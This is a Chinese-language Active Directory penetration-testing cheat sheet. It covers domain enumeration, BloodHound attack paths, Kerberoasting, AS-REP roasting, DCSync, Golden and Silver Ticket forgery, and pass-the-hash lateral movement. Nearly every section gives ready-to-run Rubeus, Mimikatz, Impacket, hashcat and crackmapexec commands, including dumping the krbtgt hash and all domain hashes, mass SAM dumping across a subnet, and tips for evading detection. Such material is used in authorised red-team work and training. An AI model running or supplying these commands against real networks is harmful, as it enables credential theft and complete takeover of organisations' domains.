# 域渗透实战参考
- 凭据获取技巧 → `post-credentials.md`
- Windows 提权 → `post-win-privesc.md`

> 覆盖: 域信息收集 → BloodHound → Kerberoasting → AS-REP Roasting → DCSync → Golden/Silver Ticket → 跨域

> **last_updated**: 2026-06-04 | **tested_against**: Windows Server 2019 AD, Rubeus, BloodHound, Impacket
---

## 1. 域信息收集

### 1.1 基础枚举

```powershell
# === 域基础信息 ===
net user /domain                            # 域用户列表
net group /domain                           # 域组列表
net group "Domain Admins" /domain           # 域管组成员
net group "Enterprise Admins" /domain       # 企业管理员
net accounts /domain                        # 域密码策略
net time /domain                            # 域控时间 (也是域控地址)

# === 定位域控 ===
nltest /dclist:domain.local                # 域控列表
echo %LOGONSERVER%                          # 当前登录的DC
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# === 信任关系 ===
nltest /domain_trusts                       # 域信任列表
nltest /trusted_domains                     # 信任的域
```

### 1.2 PowerView (PowerShell)

```powershell
# 导入
. .\PowerView.ps1

# 域信息
Get-Domain                                    # 当前域
Get-DomainController                          # 域控
Get-DomainUser                                # 用户
Get-DomainGroup "Domain Admins"               # 域管组
Get-DomainComputer                            # 计算机
Get-DomainGPO                                 # GPO
Get-DomainTrust                               # 信任关系
Get-NetForest                                 # 林信息
Get-NetForestDomain                           # 林内所有域

# 找有趣的东西
Find-DomainUserLocation                       # 域管当前登录在哪
Get-DomainFileServer                          # 文件服务器
Get-DomainDNSRecord                           # DNS 记录
Get-DomainOU                                  # OU 结构

# ACL 相关
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Find-InterestingDomainAcl                     # 找到有趣的 ACL
```

### 1.3 ADRecon

```powershell
# 自动化域信息收集 + Excel 报告
. .\ADRecon.ps1
```

---

## 2. BloodHound

### 2.1 使用流程

```bash
# === Step 1: 收集数据 (SharpHound) ===
# Windows:
SharpHound.exe -c All --zipfilename bloodhound.zip

# 或在内存执行:
SharpHound.exe -c Session,Group,LocalAdmin --stealth

# === Step 2: 导入 BloodHound ===
# 启动 Neo4j + BloodHound
# → 拖入 ZIP 文件

# === Step 3: 分析 ===
# 预置查询:
# - Find Shortest Paths to Domain Admins       (到域管的最短路径)
# - Find Principals with DCSync Rights         (有DCSync权限的主体)
# - Find Computers with Unconstrained Delegation (无约束委派)
# - Kerberoastable Users                       (可Kerberoasting用户)
# - Find AS-REP Roastable Users                (AS-REP Roasting)

# 自定义 Cypher 查询:
# MATCH (n:User) WHERE n.hasspn=true RETURN n
# MATCH p=shortestPath((u:User {name:'CURRENT_USER@DOMAIN.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p
```

### 2.2 关键攻击路径分析

```
1. 当前用户 → 某组的 GenericWrite → 修改组成员 → 加入域管组
2. 当前用户 → WriteDACL → 给自己 DCSync 权限 → DCSync
3. 当前用户 → 某计算机的 AdminTo → 去那台机器 → 域管在此登录 → 窃取凭证
4. 当前用户 → 某用户的 ForceChangePassword → 重置域管密码
5. 当前用户 → 某组的 AddMember → 加入域管组
```

---

## 3. Kerberoasting

### 3.1 原理

```
1. 域用户可查询 SPN (Service Principal Name) → 得到 TGS (服务票据)
2. TGS 用服务账户的 NTLM Hash 加密
3. 导出 TGS → 离线 Hashcat/John 破解 → 得到服务账户明文密码
4. 服务账户往往是高权限 (如 SQL Service 可能是域管)
```

### 3.2 利用

```powershell
# === Windows (Rubeus) ===
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /outfile:hashes.txt /simple     # 简洁输出

# === Linux (Impacket) ===
GetUserSPNs.py domain.local/user:password -request -outputfile hashes.txt
GetUserSPNs.py domain.local/user -hashes :NTLM_HASH -request

# === 破解 ===
hashcat -m 13100 hashes.txt rockyou.txt               # Kerberos TGS-REP
john --format=krb5tgs hashes.txt
```

### 3.3 针对性 Kerberoasting

```powershell
# 只请求特定 SPN (减少动静)
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.domain.local

# 使用 /rc4opsec (更隐蔽)
Rubeus.exe kerberoast /rc4opsec
```

---

## 4. AS-REP Roasting

### 4.1 原理

```
1. 域用户如果 "不要求 Kerberos 预认证" (UF_DONT_REQUIRE_PREAUTH)
2. 攻击者可以请求该用户的 AS-REP → 用用户 NTLM Hash 加密的部分
3. 导出 → 离线破解 → 得到用户明文密码
```

### 4.2 查找可攻击的用户

```powershell
# === PowerView ===
Get-DomainUser -PreauthNotRequired

# === BloodHound ===
# 查询: "Find AS-REP Roastable Users"

# === Rubeus ===
Rubeus.exe asreproast /outfile:asrep.txt
```

### 4.3 请求 AS-REP

```powershell
# Linux (Impacket)
GetNPUsers.py domain.local/ -usersfile users.txt -outputfile asrep_hashes.txt
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 -request

# 破解
hashcat -m 18200 asrep_hashes.txt rockyou.txt
john --format=krb5asrep asrep_hashes.txt
```

---

## 5. DCSync

### 5.1 条件

```
需要权限:
- Domain Admins
- Enterprise Admins
- 有 Replicating Directory Changes (DS-Replication-Get-Changes) 权限
- 有 Replicating Directory Changes All (DS-Replication-Get-Changes-All) 权限
```

### 5.2 利用

```bash
# === Mimikatz (在 Windows DC 或有权限的机器上) ===
mimikatz lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz lsadump::dcsync /domain:domain.local /all

# === Impacket secretsdump (Linux 远程) ===
secretsdump.py domain.local/Administrator:Password@DC.domain.local
secretsdump.py domain.local/Administrator@DC.domain.local -hashes :NTLM_HASH

# 只 dump 特定用户
secretsdump.py domain.local/user:pass@DC.domain.local -just-dc-user krbtgt
```

---

## 6. Golden Ticket / Silver Ticket

### 6.1 Golden Ticket (万能票据)

```bash
# 条件: krbtgt NTLM Hash + 域 SID + 域名
# 效果: 任意用户、任意权限、任意时间的 TGT

# === Mimikatz ===
mimikatz kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ptt

# === Impacket ticketer ===
ticketer.py -domain-sid S-1-5-21-XXXX -domain domain.local -nthash KRBTGT_HASH Administrator

# 导入 ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass Administrator@DC.domain.local
```

### 6.2 Silver Ticket (白银票据)

```bash
# 条件: 服务账户(如计算机账户) NTLM Hash + 域 SID
# 效果: 伪造特定服务的 TGS (如 CIFS/HOST/WinRM)

# === Mimikatz (伪造 CIFS 票据访问文件共享) ===
mimikatz kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /target:DC.domain.local /service:cifs /rc4:MACHINE_HASH /user:Administrator /ptt

# 也支持 HOST (计划任务)、HTTP (WinRM)、LDAP (DCSync) 等服务
```

---

## 7. 横向移动 (域内)

### 7.1 工具矩阵

| 方式 | 工具 | 需要 | 特征 |
|------|------|------|------|
| PTH SMB | `psexec.py` | NTLM Hash, 445端口 | 写服务 → 启动 |
| PTH WMI | `wmiexec.py` | NTLM Hash, 135+445 | 较隐蔽 |
| PTH WinRM | `evil-winrm` | NTLM Hash, 5985 | 加密流量 |
| PTH 计划任务 | `atexec.py` | NTLM Hash, 445 | 无交互 |
| PTT Kerberos | `psexec.py -k` | Kerberos Ticket | 需TGT |
| Overpass-the-Hash | `Rubeus asktgt` | NTLM → TGT | — |

```bash
# 批量 PTH 验证
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'HASH' --local-auth

# 批量执行命令
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'HASH' -x 'whoami'

# 批量 Dump SAM
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'HASH' --sam
```

### 7.2 约束委派 / 无约束委派

```
无约束委派 (Unconstrained Delegation):
- 计算机信任标志: TRUSTED_FOR_DELEGATION
- 用户访问该计算机 → DC 把 TGT 发给这台机 → 内存中有域管的TGT
- 用 Mimikatz/rubeus 导出

约束委派 (Constrained Delegation):
- msDS-AllowedToDelegateTo 属性指定可委派的服务
- 如果允许委派到 DC 的 ldap → 可以 DCSync
```

---
## 相关参考
- 凭据获取技巧 → `post-credentials.md`
- Windows 提权 → `post-win-privesc.md`

*参考: BloodHound + Impacket + HackTricks AD + 实战*
